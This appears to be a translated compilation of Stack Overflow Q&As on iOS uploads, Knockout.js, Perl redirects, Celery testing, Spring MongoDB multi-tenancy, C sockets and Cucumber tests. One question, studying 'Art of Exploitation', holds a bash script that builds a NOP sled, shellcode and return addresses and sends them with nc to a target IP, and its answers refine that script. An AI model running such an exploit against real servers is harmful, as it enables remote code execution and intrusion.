-(void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data{

    [imagenBytes appendData:data];

}

-(void)connectionDidFinishLoading:(NSURLConnection *)connection{

    [imagenBytes writeToFile:[DataImage imagenSource:self.name] atomically:YES];

} 
```

**现在我想用另一种方式来做。**我想要在 iPad 中创建的文件，作为照片或声音，将其保存在我的服务器中。

我还没有找到要使用的类，也没有找到如何在我的服务器中接收该数据。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T00:29:10.203

在我使用的 iPad 中创建声音[http://www.techotopia.com/index.php/Recording_Audio_on_an_iPhone_with_AVAudioRecorder_%28iOS_4%29](http://www.techotopia.com/index.php/Recording_Audio_on_an_iPhone_with_AVAudioRecorder_%28iOS_4%29)

要发送帖子数据和文件，我使用了这个链接[http://zcentric.com/2008/08/29/post-a-uiimage-to-the-web/#comment-8145](http://zcentric.com/2008/08/29/post-a-uiimage-to-the-web/#comment-8145)

因此，我没有保存 .png，而是保存了 .caf

# javascript - 在 Knockout.js 中选择复选框时如何更新视图模型及其依赖项？

> ID：12078654
> 
> 赞同：0
> 
> 时间：2012-08-22T17:46:57.313
> 
> 标签：javascript, jquery, checkbox, knockout.js, knockout-2.0

目前我有一个非常大的数据模型，它通过多个选项和事件呈现给用户。

1.  将项目列为复选框
2.  选中时更新对象的日期时间
3.  将选中项数据添加到表数组
4.  取消选择项目的两个选项：删除表格上的按钮或取消选中输入
5.  选择或取消选择项目时将更新发布到服务器

我一直无法创建正确的 knockoutjs 脚本来使所有事件成为可能。我绝对需要帮助。

这是一个例子：http: [//jsfiddle.net/likwidmack/BxZGr/10/](http://jsfiddle.net/likwidmack/BxZGr/10/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T09:14:39.487

我在这里重构了你的代码：

[http://jsfiddle.net/SKnMg/3/](http://jsfiddle.net/SKnMg/3/)

# perl - 如何从http响应中获取301/302网站重定向位置并关注？

> ID：12078662
> 
> 赞同：2
> 
> 时间：2012-08-22T17:47:42.000
> 
> 标签：perl, redirect, mechanize, lwp-useragent

我一直在尝试使用**perl Mechanize ( [WWW::Mechanize](https://metacpan.org/module/WWW::Mechanize) ) 从 http 响应中获取 301/302 重定向位置，**但是在使用 response->header 等从响应中提取它时遇到了问题。

**任何人都可以帮助从使用 301 或 302 重定向的网站的 http 响应中提取重定向位置吗？**

一旦我有了这个重定向位置 URL，我就知道我想做什么以及如何做，因为我之前用 Mechanize 做过更复杂的事情，但我只是在获取位置（或任何其他响应字段）时遇到了真正的问题http响应。

**非常感谢您的帮助，非常感谢**，CM

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T18:13:29.207

[WWW::Mechanize](https://metacpan.org/module/WWW::Mechanize)应该自动跟随重定向（除非你告诉它不要 via `requests_redirectable`），所以你不需要做任何事情。

编辑：只是为了证明：

```
DB<4> $mech = WWW::Mechanize->new;

DB<5> $mech->get('http://www.preshweb.co.uk/linkedin');

DB<6> x $mech->uri;
0  URI::http=SCALAR(0x903f990)
  -> 'http://www.linkedin.com/in/bigpresh' 
```

...如您所见，WWW::Mechanize 跟随重定向，并自动到达目的地。

根据要求更新了另一个示例：

```
DB<15> $mech = WWW::Mechanize->new;

DB<16> $mech->get('http://jjbsports.com/');

DB<17> x $mech->uri;
0  URI::http=SCALAR(0x90988f0)
 -> 'http://www.jjbsports.com/'
DB<18> x substr $mech->content, 0, 40;
0  '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML'
DB<19> x $mech->title;
0  'JJB Sports | Trainers, Clothing, Football Kits, Football Boots, Running' 
```

如您所见，它遵循重定向，并`$mech->content`返回页面内容。这些帮助有用？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:05:53.897

如果它是重定向，`WWW::Mechanize`将使用`$mech->redirect_ok();`while`request()`跟踪重定向 URL（这是一种 LWP 方法）。

笔记 -

> WWW::Mechanize 的构造函数推`POST`送到代理的 requests_redirectable 列表

因此，您不必担心推`POST`送到`requests_redirectable`列表。

如果您想绝对确定程序正在重定向您的 URL 并将每个重定向记录在日志文件（或其他内容）中，您可以使用`LWP`'s`simple_request`和 `HTTP::Response`'s`is_redirect`来检测重定向，如下所示 -

```
use WWW::Mechanize; 

$mech = WWW::Mechanize->new();  
$mech->stack_depth(0);

my $resp = $mech->simple_request( HTTP::Request->new(GET => 'http://www.googl.com/') );
if( $resp->is_redirect ) {
  my $location = $resp->header( "Location" );
  my $uri = new URI( $location );
  print "Got redirected to URL - $uri\n";    
  $mech->get($uri);
  print $mech->content;
} 
```

`is_redirect`将检测 301 和 302 响应代码。

# python - 你如何对 Celery 任务进行单元测试？

> ID：12078667
> 
> 赞同：129
> 
> 时间：2012-08-22T17:47:52.203
> 
> 标签：python, unit-testing, celery

Celery 文档[提到在 Django 中测试 Celery，](http://docs.celeryproject.org/projects/django-celery/en/2.4/cookbook/unit-testing.html)但没有说明如果您不使用 Django，如何测试 Celery 任务。你怎么做到这一点？

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2012-08-22T20:33:59.767

可以使用任何 unittest 库同步测试任务。在处理 celery 任务时，我通常会进行 2 次不同的测试。第一个（正如我在下面建议的那样）是完全同步的，应该是确保算法完成它应该做的事情的那个。第二个会话使用整个系统（包括代理）并确保我没有序列化问题或任何其他分发、通信问题。

所以：

```
from celery import Celery

celery = Celery()

@celery.task
def add(x, y):
    return x + y 
```

你的测试：

```
from nose.tools import eq_

def test_add_task():
    rst = add.apply(args=(4, 4)).get()
    eq_(rst, 8) 
```

希望有帮助！

* * *

## 回答 #2

> 赞同：64
> 
> 时间：2014-01-10T10:05:23.070

更新我七岁的答案：

您可以通过 pytest 夹具在单独的线程中运行工作人员：

[https://docs.celeryproject.org/en/stable/userguide/testing.html#celery-worker-embed-live-worker](https://docs.celeryproject.org/en/stable/userguide/testing.html#celery-worker-embed-live-worker)

根据文档，您不应使用“always_eager”（请参阅​​上述链接的页面顶部）。

* * *

老答案：

我用这个：

```
with mock.patch('celeryconfig.CELERY_ALWAYS_EAGER', True, create=True):
    ... 
```

文档：[http ://docs.celeryproject.org/en/3.1/configuration.html#celery-always-eager](http://docs.celeryproject.org/en/3.1/configuration.html#celery-always-eager)

CELERY_ALWAYS_EAGER 让您可以同步运行任务，并且不需要 celery 服务器。

* * *

## 回答 #3

> 赞同：39
> 
> 时间：2012-08-22T20:29:48.537

取决于你到底想测试什么。

*   直接测试任务代码。不要调用“task.delay(...)”，只需从单元测试中调用“task(...)”。
*   使用[CELERY_ALWAYS_EAGER](http://docs.celeryproject.org/en/v4.1.0/userguide/configuration.html#task-always-eager)。这将导致您的任务在您说“task.delay(...)”时立即被调用，因此您可以测试整个路径（但不能测试任何异步行为）。

* * *

## 回答 #4

> 赞同：33
> 
> 时间：2016-03-04T22:10:47.687

# 单元测试

```
import unittest

from myproject.myapp import celeryapp

class TestMyCeleryWorker(unittest.TestCase):

  def setUp(self):
      celeryapp.conf.update(CELERY_ALWAYS_EAGER=True) 
```

# py.test 夹具

```
# conftest.py
from myproject.myapp import celeryapp

@pytest.fixture(scope='module')
def celery_app(request):
    celeryapp.conf.update(CELERY_ALWAYS_EAGER=True)
    return celeryapp

# test_tasks.py
def test_some_task(celery_app):
    ... 
```

# 附录：使 send_task 尊重渴望

```
from celery import current_app

def send_task(name, args=(), kwargs={}, **opts):
    # https://github.com/celery/celery/issues/581
    task = current_app.tasks[name]
    return task.apply(args, kwargs, **opts)

current_app.send_task = send_task 
```

* * *

## 回答 #5

> 赞同：31
> 
> 时间：2016-12-20T18:49:26.303

对于 Celery 4 上的用户，它是：

```
@override_settings(CELERY_TASK_ALWAYS_EAGER=True) 
```

因为设置名称已更改，如果您选择升级需要更新，请参阅

[https://docs.celeryproject.org/en/latest/history/whatsnew-4.0.html?highlight=what%20is%20new#lowercase-setting-names](https://docs.celeryproject.org/en/latest/history/whatsnew-4.0.html?highlight=what%20is%20new#lowercase-setting-names)

* * *

## 回答 #6

> 赞同：17
> 
> 时间：2015-10-27T13:30:32.983

从**Celery 3.0**`CELERY_ALWAYS_EAGER`开始，在**Django**中设置的一种方法是：

```
from django.test import TestCase, override_settings

from .foo import foo_celery_task

class MyTest(TestCase):

    @override_settings(CELERY_ALWAYS_EAGER=True)
    def test_foo(self):
        self.assertTrue(foo_celery_task.delay()) 
```

* * *

## 回答 #7

> 赞同：10
> 
> 时间：2018-05-28T19:14:50.147

从 Celery **v4.0开始，**[提供](http://docs.celeryproject.org/en/latest/userguide/testing.html#py-test)了py.test 固定装置来启动一个 celery worker 来进行测试，并在完成后关闭：

```
def test_myfunc_is_executed(celery_session_worker):
    # celery_session_worker: <Worker: gen93553@mymachine.local (running)>
    assert myfunc.delay().wait(3) 
```

在[http://docs.celeryproject.org/en/latest/userguide/testing.html#py-test](http://docs.celeryproject.org/en/latest/userguide/testing.html#py-test)上描述的其他固定装置中，您可以通过重新定义固定装置来更改 celery 默认选项`celery_config`：

```
@pytest.fixture(scope='session')
def celery_config():
    return {
        'accept_content': ['json', 'pickle'],
        'result_serializer': 'pickle',
    } 
```

默认情况下，测试工作者使用内存中的代理和结果后端。如果不测试特定功能，则无需使用本地 Redis 或 RabbitMQ。

* * *

## 回答 #8

> 赞同：10
> 
> 时间：2020-03-14T11:46:02.553

使用 pytest[参考。](https://docs.celeryproject.org/en/stable/userguide/testing.html)

```
def test_add(celery_worker):
    mytask.delay() 
```

如果您使用烧瓶，请设置应用程序配置

```
 CELERY_BROKER_URL = 'memory://'
    CELERY_RESULT_BACKEND = 'cache+memory://' 
```

并且在`conftest.py`

```
@pytest.fixture
def app():
    yield app   # Your actual Flask application

@pytest.fixture
def celery_app(app):
    from celery.contrib.testing import tasks   # need it
    yield celery_app    # Your actual Flask-Celery application 
```

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2018-03-27T09:18:28.217

就我而言（我假设还有很多其他人），我想要的只是使用 pytest 测试任务的内部逻辑。

**TL;博士;** 最终嘲笑一切（**选项2**）

* * *

**示例用例**：

`proj/tasks.py`

```
@shared_task(bind=True)
def add_task(self, a, b):
    return a+b; 
```

`tests/test_tasks.py`

```
from proj import add_task

def test_add():
    assert add_task(1, 2) == 3, '1 + 2 should equal 3' 
```

但是，由于`shared_task`装饰器做了很多 celery 内部逻辑，它并不是真正的单元测试。

所以，对我来说，有两个选择：

**选项 1：独立的内部逻辑**

`proj/tasks_logic.py`

```
def internal_add(a, b):
    return a + b; 
```

`proj/tasks.py`

```
from .tasks_logic import internal_add

@shared_task(bind=True)
def add_task(self, a, b):
    return internal_add(a, b); 
```

这看起来很奇怪，除了使其可读性降低之外，它还需要手动提取和传递作为请求的一部分的属性，例如`task_id`以防万一，这会使逻辑不那么纯粹。

**选项 2：嘲笑**
嘲笑芹菜内部

`tests/__init__.py`

```
# noinspection PyUnresolvedReferences
from celery import shared_task

from mock import patch

def mock_signature(**kwargs):
    return {}

def mocked_shared_task(*decorator_args, **decorator_kwargs):
    def mocked_shared_decorator(func):
        func.signature = func.si = func.s = mock_signature
        return func

    return mocked_shared_decorator

patch('celery.shared_task', mocked_shared_task).start() 
```

然后允许我模拟请求对象（同样，如果您需要请求中的内容，例如 id 或重试计数器。

`tests/test_tasks.py`

```
from proj import add_task

class MockedRequest:
    def __init__(self, id=None):
        self.id = id or 1

class MockedTask:
    def __init__(self, id=None):
        self.request = MockedRequest(id=id)

def test_add():
    mocked_task = MockedTask(id=3)
    assert add_task(mocked_task, 1, 2) == 3, '1 + 2 should equal 3' 
```

该解决方案更加手动，但是，它为我提供了实际**单元**测试所需的控制权，无需重复自己，也不会丢失 celery 范围。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-02-07T16:29:51.793

我在单元测试中看到了很多`CELERY_ALWAYS_EAGER = true`方法作为单元测试的解决方案，但是由于版本 5.0.5 可用，因此有很多变化使得大多数旧答案被弃用，对我来说是一个耗时的废话，所以对于每个人在这里搜索解决方案，转到文档并阅读新版本的有据可查的单元测试示例：

[https://docs.celeryproject.org/en/stable/userguide/testing.html](https://docs.celeryproject.org/en/stable/userguide/testing.html)

对于带有单元测试的 Eager Mode，这里引用了实际文档的引用：

> 渴望模式
> 
> task_always_eager 设置启用的渴望模式根据定义不适合单元测试。
> 
> 在使用 Eager 模式进行测试时，您只是在测试工作人员中发生的情况的仿真，并且仿真与实际发生的情况之间存在许多差异。

# java - spring-data-mongodb 在一个 Mongo 实例中连接多个数据库

> ID：12078669
> 
> 赞同：26
> 
> 时间：2012-08-22T17:47:56.383
> 
> 标签：java, spring, mongodb, spring-data, spring-data-mongodb

我正在使用最新的 spring-data-mongodb (1.1.0.M2) 和最新的 Mongo Driver (2.9.0-RC1)。我有一种情况，我有多个客户端连接到我的应用程序，我想在同一个 Mongo 服务器中为每个客户端提供自己的“模式/数据库”。如果我直接使用驱动程序，这不是一项很难完成的任务：

```
Mongo mongo = new Mongo( new DBAddress( "localhost", 127017 ) );

DB client1DB = mongo.getDB( "client1" );
DBCollection client1TTestCollection = client1DB.getCollection( "test" );
long client1TestCollectionCount = client1TTestCollection.count();

DB client2DB = mongo.getDB( "client2" );
DBCollection client2TTestCollection = client2DB.getCollection( "test" );
long client2TestCollectionCount = client2TTestCollection.count(); 
```

看，轻松。但是 spring-data-mongodb 不允许使用多个数据库的简单方法。建立连接的首选方法`Mongo`是扩展[AbstractMongoConfiguration](http://static.springsource.org/spring-data/data-mongodb/docs/1.1.0.M2/api/org/springframework/data/mongodb/config/AbstractMongoConfiguration.html)类：

您将看到您覆盖了以下方法：

```
getDatabaseName() 
```

所以它迫使你使用一个数据库名称。然后您构建的存储库接口使用传递给类的 MongoTemplate 中的数据库名称`SimpleMongoRepository`。

我到底会在哪里粘贴多个数据库名称？我必须创建多个数据库名称、多个`MongoTempate`s（每个数据库名称一个）和多个其他配置类。这仍然没有让我的存储库接口使用正确的模板。如果有人尝试过这样的事情，请告诉我。如果我弄清楚了，我会在这里发布答案。

谢谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-31T21:14:35.683

这是我认为您正在寻找的文章的链接[http://michaelbarnesjr.wordpress.com/2012/01/19/spring-data-mongo/](http://michaelbarnesjr.wordpress.com/2012/01/19/spring-data-mongo/)

关键是提供多个模板

为每个数据库配置一个模板。

```
<bean id="vehicleTemplate" class="org.springframework.data.mongodb.core.MongoTemplate">
    <constructor-arg ref="mongoConnection"/>
    <constructor-arg name="databaseName" value="vehicledatabase"/>
</bean> 
```

为每个数据库配置一个模板。

```
<bean id="imageTemplate" class="org.springframework.data.mongodb.core.MongoTemplate">
        <constructor-arg ref="mongoConnection"/>
        <constructor-arg name="databaseName" value="imagedatabase"/>
</bean>

<bean id="vehicleTemplate" class="org.springframework.data.mongodb.core.MongoTemplate">
    <constructor-arg ref="mongoConnection"/>
    <constructor-arg name="databaseName" value="vehicledatabase"/>
</bean> 
```

现在，您需要告诉 Spring 您的存储库在哪里，以便它可以注入它们。它们必须都在同一个目录中。我试图将它们放在不同的子目录中，但它无法正常工作。所以它们都在存储库目录中。

```
<mongo:repositories base-package="my.package.repository">
    <mongo:repository id="imageRepository" mongo-template-ref="imageTemplate"/>
    <mongo:repository id="carRepository" mongo-template-ref="vehicleTemplate"/>
    <mongo:repository id="truckRepository" mongo-template-ref="vehicleTemplate"/>
</mongo:repositories> 
```

每个存储库都是一个接口，编写如下（是的，您可以将它们留空）：

```
@Repository
public interface ImageRepository extends MongoRepository<Image, String> {

}

@Repository
public interface TruckRepository extends MongoRepository<Truck, String> {

} 
```

私有变量的名字`imageRepository`就是集合！*Image.java*将被保存到 imagedb 数据库中的图像集合中。

以下是*查找*、*插入*和*删除*记录的方法：

```
@Service
public class ImageService {

    @Autowired
    private ImageRepository imageRepository;
} 
```

通过自动装配，您可以将变量名称与配置中的名称 (id) 匹配。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-22T22:56:57.403

`SimpleMongoDbFactory`您可能希望对返回的默认数据库进行子类化和策略化`getDb`。一种选择是使用线程局部变量来决定要使用的 Db，而不是使用多个 MongoTemplates。

像这样的东西：

```
public class ThreadLocalDbNameMongoDbFactory extends SimpleMongoDbFactory {
    private static final ThreadLocal<String> dbName = new ThreadLocal<String>();
    private final String defaultName; // init in c'tor before calling super

    // omitted constructor for clarity

    public static void setDefaultNameForCurrentThread(String tlName) {
        dbName.set(tlName);
    }
    public static void clearDefaultNameForCurrentThread() {
        dbName.remove();
    }

    public DB getDb() {
        String tlName = dbName.get();
        return super.getDb(tlName != null ? tlName : defaultName);
    }
} 
```

然后，`mongoDBFactory()`在你的`@Configuration`类中重写，`AbstractMongoConfiguration`像这样扩展：

```
@Bean
@Override
public MongoDbFactory mongoDbFactory() throws Exception {
  if (getUserCredentials() == null) {
      return new ThreadLocalDbNameMongoDbFactory(mongo(), getDatabaseName());
  } else {
      return new ThreadLocalDbNameMongoDbFactory(mongo(), getDatabaseName(), getUserCredentials());
  }
} 
```

在您的客户端代码（可能是 ServletFilter 或类似的代码）中，您需要 `ThreadLocalDBNameMongoRepository.setDefaultNameForCurrentThread()` 在执行任何 Mongo 工作之前 调用：，然后在`ThreadLocalDBNameMongoRepository.clearDefaultNameForCurrentThread()` 完成之后使用：重置它。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-10-09T15:17:55.043

`spring-data-mongodb`因此，经过大量研究和实验，我得出结论，目前的项目还不可能。我在上面尝试了 baja 的方法并遇到了一个特定的障碍。从其构造函数中运行`MongoTemplate`其方法。`ensureIndexes()`此方法调用数据库以确保数据库中存在带注释的索引。`MongoTemplate`启动时调用构造函数，`Spring`所以我什至没有机会设置`ThreadLocal`变量。我必须在`Spring`启动时设置默认值，然后在收到请求时更改它。这是不允许的，因为我不想要也没有默认数据库。

不过，一切都没有丢失。我们最初的计划是让每个客户端在自己的应用服务器上运行，指向服务器上自己的`MongoDB`数据库`MongoDB`。然后我们可以提供一个`-Dprovider=`系统变量，每个服务器运行时只指向一个数据库。

我们被指示拥有一个多租户应用程序，因此尝试使用该`ThreadLocal`变量。但由于它不起作用，我们能够按照我们最初设计的方式运行应用程序。

我相信有一种方法可以使这一切正常工作，它只需要比其他帖子中描述的更多。你必须自己做`RepositoryFactoryBean`。这是[Spring Data MongoDB Reference Docs](http://static.springsource.org/spring-data/data-mongodb/docs/1.1.0.RC1/reference/html/#repositories.custom-behaviour-for-all-repositories)中的示例。您仍然必须实施自己的`MongoTemplate`并延迟或删除`ensureIndexes()`呼叫。但是您必须重写一些类以确保`MongoTemplate`调用您的而不是`Spring's`. 换句话说，工作量很大。我想看到甚至做的工作，我只是没有时间。

感谢您的回复。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-08-23T16:23:48.827

要看的地方是`MongoDbFactory`界面。它的基本实现需要一个 Mongo 实例，并在整个应用程序生命周期中使用它。要实现每个线程（以及每个请求）的数据库使用，您可能必须按照[AbstractRoutingDataSource](http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/jdbc/datasource/lookup/AbstractRoutingDataSource.html)的方式实现一些东西。这个想法几乎是你有一个模板方法，它必须在每次调用时查找租户（`ThreadLocal`我猜是绑定的），然后`Mongo`从一组预定义的实例或一些自定义逻辑中选择一个实例来为新的租户等

请记住，`MongoDbFactory`通常 get 是通过该`getDb()`方法使用的。但是，MongoDB 中有一些特性需要我们提供`getDb(String name)`. `DBRef`s（就像关系世界中的外键一样）可以指向文档完全不同的数据库。因此，如果您正在执行委托，请避免使用该功能（我认为`DBRef`指向另一个数据库的 s 是唯一调用的地方`getDb(name)`）或明确处理它。

从配置的角度来看，您可以简单地`mongoDbFactory()`完全覆盖或根本不扩展基类并提出您自己的基于 Java 的配置。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-09-24T18:06:19.240

我使用 java Config 使用了不同的数据库，这就是我的做法：

```
@Bean 
public MongoDbFactory mongoRestDbFactory() throws Exception { 
    MongoClientURI uri=new MongoClientURI(environment.getProperty("mongo.uri")); 
    return new SimpleMongoDbFactory(uri);
}

@Override
public String getDatabaseName() {
    return "rest";
}

@Override
public @Bean(name = "secondaryMongoTemplate") MongoTemplate mongoTemplate() throws Exception{ //hay que cambiar el nombre de los templates para que el contendor de beans sepa la diferencia  
    return new MongoTemplate(mongoRestDbFactory());    
} 
```

另一个是这样的：

```
@Bean 
public MongoDbFactory restDbFactory() throws Exception {
    MongoClientURI uri = new MongoClientURI(environment.getProperty("mongo.urirestaurants")); 
    return new SimpleMongoDbFactory(uri);
}

@Override
public String getDatabaseName() {
    return "rest";
}

@Override
public @Bean(name = "primaryMongoTemplate") MongoTemplate mongoTemplate() throws Exception{ 
    return new MongoTemplate(restDbFactory());    
} 
```

所以当我需要更改我的数据库时，我只选择要使用的配置

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2017-03-27T11:32:43.187

据我了解，您需要更灵活地动态更改当前数据库。

我已经链接了一个以简单方式实现多租户的项目。

它可以用作应用程序的起点。

它实现了 SimpleMongoDbFactory 并提供了一个自定义的 getDB 方法来解析正确的数据库以在特定时刻使用。它可以通过多种方式进行改进，例如，通过从 SpringSession 对象的 HttpSession 检索数据库详细信息，例如可以由 Redis 缓存。

要让不同的 mongoTemplates 同时使用不同的数据库，可以将 mongoDbFactory 的范围更改为 session。

参考：

[多租户spring-mongodb](https://github.com/Loki-Afro/multi-tenant-spring-mongodb)

# c - 我的程序没有打开套接字

> ID：12078670
> 
> 赞同：1
> 
> 时间：2012-08-22T17:47:57.163
> 
> 标签：c, sockets

这是我编写的聊天客户端服务器程序的服务器部分。我创建了一个线程池，服务器必须将连接的客户端关联到一个线程。线程函数 gestisci() 接收来自客户端的命令并将消息从客户端 1 发送到客户端 2。但是，一旦我运行它，终端上就什么也没有出现。有人能帮我吗？

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include<sys/wait.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pthread.h>

#define BACKLOG_SIZE 5
#define SA struct sockaddr

void* gestisci_richiesta(void*dati)

int main(int argc, char* argv[]) {

    printf("in main function\n");
    struct sockaddr_in srv_addr, cl_addr;
    int ret, sock, cn_sk, porta, t;
    struct argomenti{
        int sock_cl,stato;
        struct sockaddr_in cl_addr;
        int index;}
    struct argomenti mess[BACKLOG_SIZE];
    int arg_cont[BACKLOG_SIZE];
    socklen_t len;
    int t_free[BACKLOG_SIZE];
    pthread_t tid[BACKLOG_SIZE];

    if (argc < 2)
        printf("errore:inserire numero porta\n");

    porta = atoi(argv[1]);
    printf(" %d\n", porta);

    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("server: impossibile creare un nuovo socket.\n");
        return 0;
    }

    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY );/* il server si mette in ascolto suqualsiasi delle sueinerfacce di rete*/
    srv_addr.sin_port = htons(porta);

    ret = bind(sock, (SA*) &srv_addr, sizeof(srv_addr));
    if (ret == -1) {
        printf("server : impossibile eseguire il bind sul socket.\n");
        return 0;
    }
    printf("bind con successo\n");

    listen(sock, BACKLOG_SIZE);
    for (t = 0; t < BACKLOG_SIZE; t++) {
        t_free[t] = 0;
        client[t] = 0;
    }

              t= 0;
    while (1) {

        while (t_free[t] != 0)
            t = (t + 1) % BACKLOG_SIZE;
        t_free[t] = 1;
        len = (socklen_t) sizeof(mess[t].cl_addr);
        cn_sk = accept(sock, (SA*) &mess[t].cl_addr, &len);
        mess[t].sock_cl = cn_sk;
        mess[t].index = t;
        printf("client:%d connesso\n", t);
        if (cn_sk == -1) {
            printf("SERVER: errore in attesa di connessione\n");
            return 0;
        }
        if (pthread_create(&tid[t], 0, gestisci_richiesta, (void*) &mess[t])) {
            printf("server:impossibile avviare un thread dal pool\n");
            return 0;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T23:55:11.310

您在其中几个 printfs 上缺少 \n，这将导致它们被缓冲而不是立即打印出来。

存在其他问题。您调用 socket() 的错误消息具有误导性。尚未尝试使用指定的端口。这发生在 bind() 中。没有理由假设客户端的数量将等于积压的大小。sockaddr_in 的大小始终相同：无需每次都重新计算。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T00:29:52.050

你应该`t = 0;`先搬家`while(1)`。

# testing - 针对外部资源编写集成测试，即 A/B 测试

> ID：12078675
> 
> 赞同：2
> 
> 时间：2012-08-22T17:48:26.690
> 
> 标签：testing, selenium, cucumber, integration-testing, capybara

我有一点设计问题，我很好奇其他用户是否遇到过这个问题以及如何开发最优雅的解决方案。我在 Cucumber 中使用 Capybara/Celerity/Selenium 进行了一些集成类型的功能测试。这些测试的一部分驱动一个外部网站来查看我的资源集成的情况（cookies、Javascript 等）。

一个特定的外部站点正在进行他们自己的繁重 A/B 测试，其站点设计相似但明显不同，因此我的测试在新站点上失败而在旧站点上运行，因此只有大约 50% 的时间通过。显然，为新的测试重写我的测试是没有意义的，因为这些仍然会使其他 50% 失败。

我尝试以如下方式参数化我的函数：

```
Given I visit the new site
And I click on the link that is labeled "new link text"

Given I visit the old site
And I click on the link that is labeled "old link text" 
```

...

```
When /^I visit the (old|new) site$/ do |version|
  version_url = "http://www.example.com/?backdoorversionparam=0"
  if version == "new"
    version_url = "http://www.example.com/?backdoorversionparam=1"
  end
  When "I go to the page \"#{version_url}\""
end 
```

这仍然需要我编写两个基本相同、相当大的功能文件（但所有参数都已更改）。我将不得不稍后弃用旧的，然后我的所有代码都很复杂。如果失败了，有没有办法退回到替代测试？知道页面设计测试将持续一个月左右，并且整个网站可能会在另一年再次发生变化，那么设计这个最优雅的方法是什么？

# security - 这个 bash 脚本可以更简洁吗？

> ID：12078676
> 
> 赞同：2
> 
> 时间：2012-08-22T17:48:28.793
> 
> 标签：security, bash, shell, gdb

要点：这个脚本可以更干净更简洁吗？

所以我正在研究 Erickson 的 Art of Exploitation，他介绍了一种自动化工具的开发，以更快地利用他的 tinywebserver 守护进程。

但是，在 Ubuntu 10.04 上，每次重新启动守护程序时，返回地址都会更改。我调整了脚本以自动从 GDB 获取返回地址。我以前从未编写过任何脚本，下面的脚本可以工作，但我想知道它是否可以更干净，尤其是 GDB 行。

基本上，我启动守护进程，然后获取 pid。然后我自动运行 GDB 以获得正确的返回地址。这将保存到日志文件中。

我使用 cut 获取返回地址，使用 sed 分隔它，并使用 awk 为 shellcode 正确格式化它。

其他一切都来自书中。

关于 gdb 行和 cut/sed/awk 行的任何反馈？

感谢您的任何建议。

```
#!/bin/sh
# a tool for exploiting tinywebd

if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi 

./tinywebd
pid=$(pidof tinywebd)

OFFSET=524  # changed to work on eve

#RETADDR="\xe4\x9a\xd2\xbf" # 
sudo gdb -q -pid=$pid --symbols=./tinywebd --batch -ex "break 86" 
--batch -ex "c"--batch -ex "set logging on gdblog" --batch -ex "x/x request+100"
--batch -ex "set logging off" --batch -ex "quit"

RETADDR=$(cut -d: -f1 gdblog | sed 's/\(.\{2\}\)/\1 /g' | 
awk '{ print "\\x"$5"\\x"$4"\\x"$3"\\x"$2}')
rm -f gdblog

echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))

echo "[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr ($((4*32)) 
bytes)]"
( perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
 perl -e "print \"$RETADDR\"x32 . \"\r\n\"";) | nc -w 1 -v $2 80 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:59:22.537

```
cut -d: -f1 gdblog | sed 's/\(.\{2\}\)/\1 /g' | awk '{ print "\\x"$5"\\x"$4"\\x"$3"\\x"$2}' 
```

似乎相当于 perl one-liner：

```
perl -ple '$_=join"",map"\\x$_",(/(..)/g)[4,3,2,1]' gdblog 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-18T13:12:28.667

gdb 行可以缩短：

```
sudo gdb -batch -ex "break 86" -ex c -ex "set logging on gdblog" -ex "x/x request+100" -ex quit ./tinywebd $pid 
```

*   -batch 意味着 -q 并且只需要一次
*   最后不需要“设置注销”
*   可以不带选项指定可执行文件和 PID

如果你的 awk 支持 FIELDWIDTHS 变量，我们可以很容易地不用 cut 和 sed：

```
RETADDR=$(awk -v FIELDWIDTHS="2 2 2 2 2" '{print "\\x"$5"\\x"$4"\\x"$3"\\x"$2}' gdblog) 
```

或者，即使它没有：

```
RETADDR=$(awk '{gsub("..", "& "); print "\\x"$5"\\x"$4"\\x"$3"\\x"$2}' gdblog) 
```

# jakarta-ee - Tomcat中的jsp自定义标签——标签实例化

> ID：12078677
> 
> 赞同：2
> 
> 时间：2012-08-22T17:48:30.147
> 
> 标签：jakarta-ee, tomcat, jsp-tags

我们有一个使用 jsp 自定义标签的网络应用程序。我们在 Weblogic 10 和 Tomcat 6 上都运行它。一些标签在 Tomcat 中不起作用。我们将错误追溯到 Weblogic 和 Tomcat 之间的以下差异。

在 Weblogic 中，jsp 自定义标记的构造函数会在 jsp 中每次出现该标记时调用。而在 Tomcat 中，jsp 自定义标签的构造函数只被调用一次，在标签第一次出现时，无论标签在 jsp 页面上使用了多少次。

